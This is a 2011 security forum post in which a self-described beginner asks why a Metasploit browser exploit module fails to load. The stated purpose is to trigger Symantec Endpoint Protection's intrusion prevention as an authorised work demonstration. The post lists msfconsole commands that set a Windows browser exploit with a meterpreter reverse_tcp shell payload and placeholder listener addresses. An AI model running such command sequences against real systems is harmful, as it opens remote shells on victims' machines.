---
title: "Metasploit module load fail, help for beginner"
date: 2011-11-08
forum: Security
---

### Post by borgy95 on 2011-11-08
Hi,

I should preface all this with, me being a massive beginner in the unbuntu and metasploit worlds. It is safe to assume i have little to no knowledge on this stuff.

Currently I have successfully set up the webserver piece and been using the set of commands below to activate the exploit i want to activate. The exploit is aimed at triggering the Symantec endpoint protection (SEP) Intrusion Prevention System... (I am doing this legitmately as i work for the company and am tasked with demonstrating how the software responds to this)

cd /
cd pentest/exploits/framework3
./msfconsole
use exploit/windows/browser/ms11 (then hit tab and select one of the two options)
set payload windows meterpreter/reverse_tcp
set lhost x.x.x.x
set lport 5059
set uripath / 
set srvhost x.x.x.x
set srvport 5059
exploit -j -z

It seems to worked to a limited ammount as metasploit is registering connections being made. However no exploit is running to trigger SEP.
I went back into the cmd line and when doing the use "exploit command" i get the message "module failed to load".

The above commands were given to me as verbatim instructions. I can't ask the person who gave them to me as he has left the company.
So if anyone could spare abit of time to help me through this it would be much appreciated?

If there is anymore info you need please do let me know i can imagine i missed some.

Thank you in advance.

---

